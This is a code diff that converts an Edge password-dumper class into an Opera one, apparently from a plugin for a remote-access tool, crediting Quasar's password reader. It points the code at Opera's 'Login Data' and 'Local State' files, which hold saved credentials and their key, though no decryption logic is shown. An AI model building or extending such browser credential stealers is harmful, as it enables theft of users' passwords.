@@ -1,27 +1,24 @@
 ﻿using System;
 using System.Collections.Generic;
+using System.Data;
 using System.Linq;
 using System.Text;
 using System.Threading.Tasks;
-using System.Data;
 using System.IO;
+using Newtonsoft.Json.Linq;
 using Plugin.Abstractions48;
 using System.Text.RegularExpressions;
-using Newtonsoft.Json.Linq;
-using Newtonsoft.Json;
-using static Plugin48Dumper.clsChromeDumper;
-using System.Security.Cryptography;
 
 namespace Plugin48Dumper
 {
-    internal class clsEdgeDumper : clsDumper
+    internal class clsOperaDumper : clsDumper
     {
         /// <summary>
-        /// Acknowledgement: https://github.com/quasar/Quasar/blob/master/Quasar.Client/Recovery/Browsers/EdgePassReader.cs
+        /// Acknowledgement: https://github.com/quasar/Quasar/blob/master/Quasar.Client/Recovery/Browsers/OperaPassReader.cs
         /// </summary>
 
-        private string EdgeDir { get { return Path.Combine(ApplicationData, "Microsoft", "Edge"); } }
-        private string UserDataFile { get { return Path.Combine(EdgeDir, "User Data"); } }
+        private string OperaDir { get { return Path.Combine(ApplicationData, "Opera Software", "Opera Stable"); } }
+        private string UserDataFile { get { return Path.Combine(OperaDir, "User Data"); } }
         private string DefaultDir { get { return Path.Combine(UserDataFile, "Default"); } }
         private string LocalStateFile { get { return Path.Combine(UserDataFile, "Local State"); } }
         private string LoginFile { get { return Path.Combine(DefaultDir, "Login Data"); } }
@@ -32,11 +29,11 @@ namespace Plugin48Dumper
 
         public DataTable dtHelp = new DataTable();
 
-        public clsEdgeDumper()
+        public clsOperaDumper()
         {
-            Description = "Edge dumper.";
+            Description = "Opera dumper.";
             Usage = "foo";
-            Entry = "edge";
+            Entry = "opera";
 
             dtHelp.Columns.Add("Action");
             dtHelp.Columns.Add("Description");
